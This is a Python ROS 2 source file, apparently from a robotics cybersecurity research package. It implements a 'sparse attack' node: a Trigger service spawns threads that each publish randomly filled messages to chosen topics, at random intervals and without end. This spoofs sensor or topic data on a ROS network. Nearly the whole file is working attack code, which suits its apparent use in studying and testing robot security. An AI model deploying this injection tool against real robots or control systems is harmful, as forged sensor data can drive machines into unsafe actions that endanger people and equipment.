import rclpy, sys, os, threading, time, random
from rclpy.node import Node, NodeNameNonExistentError
from roboticpark_cyberattacks.utils import rslg, printargs, import_message_type, fill_msg_with_random_values
from rcl_interfaces.srv import *
from std_srvs.srv import Trigger
from multiprocessing import Pool

class sparsenode(Node):

    sparseTopics = None
    sparseTopicsType = None
    sparseFrameId = None
    sparseDoubleRangeStart = None
    sparseDoubleRangeEnd = None
    sparseIntRangeStart = None 
    sparseIntRangeEnd = None
    sparseTimeRangeStart = None 
    sparseTimeRangeEnd = None


    def __init__(self):
        super().__init__("replynode")
        self.declare_parameter('sparse_topics', "Unset")
        self.declare_parameter('sparse_topics_type', "Unset")
        self.declare_parameter('sparse_frame_id', "Unset")
        self.declare_parameter('sparse_double_range_start',0.0)
        self.declare_parameter('sparse_double_range_end', 0.0)
        self.declare_parameter('sparse_int_range_start', 0)
        self.declare_parameter('sparse_int_range_end', 0)
        self.declare_parameter('sparse_time_range_start',0)
        self.declare_parameter('sparse_time_range_end', 0)


        self.sparseTopics = (self.get_parameter('sparse_topics').get_parameter_value().string_value).split(',')
        self.sparseTopicsType = (self.get_parameter('sparse_topics_type').get_parameter_value().string_value).split(',')
        self.sparseFrameId = self.get_parameter('sparse_frame_id').get_parameter_value().string_value
        self.sparseDoubleRangeStart = self.get_parameter('sparse_double_range_start').get_parameter_value().double_value
        self.sparseDoubleRangeEnd = self.get_parameter('sparse_double_range_end').get_parameter_value().double_value
        self.sparseIntRangeStart = self.get_parameter('sparse_int_range_start').get_parameter_value().integer_value
        self.sparseIntRangeEnd = self.get_parameter('sparse_int_range_end').get_parameter_value().integer_value
        self.sparseTimeRangeStart = self.get_parameter('sparse_time_range_start').get_parameter_value().integer_value
        self.sparseTimeRangeEnd = self.get_parameter('sparse_time_range_end').get_parameter_value().integer_value

        
        printargs(self)
        
        # Create sparse attack launch service
        serviceName = f'{self.get_name()}/start_sparse_attack'
        self.srv = self.create_service(Trigger, serviceName, self.launch_attack_wrapper)

        rslg(self,' '.join(self.sparseTopics)) 
        rslg(self,' '.join(self.sparseTopicsType))
        if not self.sparseTopics or not self.sparseTopicsType:
            rslg(self,f'No topic or topic type present. Remember, you need to put at least two of them, separated by commas')
            sys.exit()


    def launch_attack_wrapper(self, request,response):
        """This function  save messagess from the selected topic to a list in memory
        It creates a subscription to a topic, and then stores the needed amount of messagges

        Parameters:

        self: Node, the node used to perform the activities.
        request: Dict, the request
        response:  Dict, the response

        """
        response.message = f"Sent messagges to topic/sensors "
        rslg(self,f'Sending messaggess')

        for (x,y) in zip(self.sparseTopics,self.sparseTopicsType):
            threading.Thread(target=self.launch_attack,args=(x,y)).start()
        
        response.success = True
        response.message = response.message
        return response

    def launch_attack(self,topic,topicType):
        """This function  launch the sparse attack itself. It publishes msgs into the desired topics.

        Parameters:

        self: Node, the node used to perform the activities.
        topic: String, the desired topic
        topicType:  The type of the topic

        """
        pid = threading.get_ident()
        logname = f'log-{pid}.log'

           
        myTopicType = import_message_type(self,topicType)
        msg = myTopicType()

        publisher = self.create_publisher(myTopicType,topic,10)
        
        with open(logname, "a") as myfile:
            while 1:
                time.sleep(random.randint(self.sparseTimeRangeStart,self.sparseTimeRangeEnd))
                myfile.write(f"Thread PID {pid}: {topic},{topicType} \n")
                msg = fill_msg_with_random_values(msg,self.sparseDoubleRangeStart,self.sparseDoubleRangeEnd,self.sparseIntRangeStart,self.sparseIntRangeEnd,self.sparseFrameId)
                myfile.flush()
                publisher.publish(msg)


def main():
    rclpy.init()
    mysparsenode = sparsenode()

    rclpy.spin(mysparsenode)

    rclpy.shutdown()
    